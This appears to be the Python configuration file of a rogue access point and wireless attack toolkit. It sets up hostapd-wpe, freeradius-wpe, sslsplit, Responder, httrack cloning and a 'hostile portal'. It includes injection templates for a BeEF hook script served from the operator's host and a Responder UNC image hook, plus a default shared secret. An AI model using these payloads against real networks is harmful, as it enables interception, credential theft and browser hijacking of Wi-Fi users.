#!/usr/bin/python
import os
import argparse

# application version
__version__ = "1.1.1"

# directory mapping
root_dir, conf_file = os.path.split(os.path.abspath(__file__))
core_dir = root_dir + "/core"
logdir = root_dir + "/logs"
working_dir = root_dir + "/tmp"
conf_dir = core_dir + "/config"
lib_dir = core_dir + "/libs"
templates_dir = root_dir + "/templates"

# installation
install_dir = root_dir + "/install"
software_dep = install_dir + "/software.req"
pip_dep = install_dir + "/pip.req"

## Certificates
certs_dir = core_dir + "/certs"
ca_cnf = certs_dir + "/ca.cnf"
server_cnf = certs_dir + "/server.cnf"
client_cnf = certs_dir + "/client.cnf"
bootstrap_file = certs_dir + "/bootstrap"
ca_pem = certs_dir + "/ca.pem"
ca_key = certs_dir + "/ca_no_pass.key"
ca_crt = certs_dir + "/ca.crt"
server_pem = certs_dir + "/server.pem"
private_key = certs_dir + "/server.key"
private_pem = certs_dir + "/server.pem"
dh_file = certs_dir + "/dh"

# hostapd-wpe settings
hostapd_conf_file = "/hostapd-wpe.conf"
hostapd_conf_full = working_dir + hostapd_conf_file
hostapd_command = "%s "
hostapd_command_with_karma = "%s -k"
hostapd_command_with_debug = "%s -d"
hostapd_command_with_ddebug = "%s -dd"
hostapd_log = logdir + "/hostapd-wpe.log"
hostapd_dir = "/usr/sbin"
hostapd_bin = hostapd_dir + "/hostapd-wpe"
eap_user_file = "/etc/hostapd-wpe/hostapd-wpe.eap_user"

# freeradius-wpe settings
freeradius_dir = "/usr/sbin"
freeradius_bin = freeradius_dir + "/freeradius-wpe"
freeradius_log = logdir + "/freeradius-wpe.log"
freeradius_working_dir = "/etc/freeradius-wpe/3.0"
freeradius_mods_dir = freeradius_working_dir + '/mods-available'
freeradius_mods_dir_eap_full = freeradius_mods_dir + '/eap'
freeradius_radiusd_full = freeradius_working_dir + '/radiusd.conf'
freeradius_clients_full = freeradius_working_dir + '/clients.conf'
freeradius_command = "-X -l %s -d %s"
wpelogfile = logdir + "/freeradius-server-wpe.log"
wpelogfile_default_install = "/var/log/freeradius-server-wpe.log"
radiuslog = logdir + "/radius.log"
default_own_ip_addr = "127.0.0.1"
default_auth_server_addr = default_own_ip_addr
default_auth_server_shared_secret = "secret"
default_auth_server_port = 1812
default_acct_server_addr = default_own_ip_addr
default_acct_server_shared_secret = "secret"
default_acct_server_port = 1813

# isc-dhcp-server settings
dhcp_conf_dir = "/etc/dhcp"
dhcp_conf = dhcp_conf_dir + "/dhcpd.conf"
dhcp_default = "/etc/default/isc-dhcp-server"
default_dhcpv4_conf_location = dhcp_conf
default_ip_address = "10.254.239.1"
default_dhcp_netmask = "255.255.255.0"
default_route_subnet = "10.254.239"
default_dhcp_subnet = "10.254.239.0"
default_dhcp_pool_start = "10.254.239.10"
default_dhcp_pool_end = "10.254.239.70"
default_default_lease_time = 600
default_max_lease_time = 7200
default_primary_name_server = "8.8.8.8"
default_secondary_name_server = "8.8.4.4"

# httpd settings
http_dir = "/etc/apache2"
http_sites_available = http_dir + "/sites-available"
http_sites_enabled = http_dir + "/sites-enabled"
http_name_conf = "000-rogue.conf"
http_conf_full = http_sites_available + "/" + http_name_conf
http_port = 80
http_ssl_port = 443
http_error_log = "{" + "APACHE_LOG_DIR" + "}"
http_custom_log = "{" + "APACHE_LOG_DIR" + "}"
http_root = '/var/www/html'

## Attack configs

# httrack configuration
httrack_dest = http_root

# sslsplit
sslsplit_log = logdir + "/sslsplit.log"
sslsplit_tmp = working_dir + "/sslsplit"
sslsplit_jail = sslsplit_tmp + "/jail"
sslsplit_encrypted_port = 8443
sslsplit_cmd = "-d -l %s -j %s -S %s -k %s -c %s ssl 0.0.0.0 %d"

# responder
responder_bin = '/usr/bin/responder'
responder_cmd = '-I %s -rf 2>&1'
responder_conf = '/etc/responder/Responder.conf'
responder_hook = '<img src="\\\\%s\\hook">\n'

# Beef framework
beef_hook = "<script src='http://%s:3000/hook.js'></script>\n"

# Hostile portal
hostile_target_file="/index.html"
hostile_insert_marker ='</body>\n'

# tcpdump
tcpdump_logdir = logdir
tcpdump_cmd = "-i %s -w %s"

# service configs
use_systemd = True
network_manager = "network-manager"
network_manager_bin = None
tcpdump_bin = "/usr/sbin/tcpdump"
dhcp_server = "isc-dhcp-server"
dhcp_server_bin = None
httpd = "apache2"
httpd_bin = None
wpa_supplicant = "wpa_supplicant"
wpa_supplicant_bin = None
beef = "beef-xss"
httrack_bin = "/usr/bin/httrack"
sslsplit_bin = "/usr/bin/sslsplit"


# don't touch these
wlan_clean_sleep = 1
generic_sleep = 3
httpd_sleep = generic_sleep
tcpdump_sleep = generic_sleep
hostapd_sleep = 4
freeradius_sleep = 4
sslsplit_sleep = 4
beef_sleep = 4
responder_sleep = 4
network_manager_sleep = 4
dhcp_server_sleep = 4
wpa_supplicant_sleep = 4
secondary_interface = "eth0"
proc_ipforward = "/proc/sys/net/ipv4/ip_forward"
default_browser = "firefox"
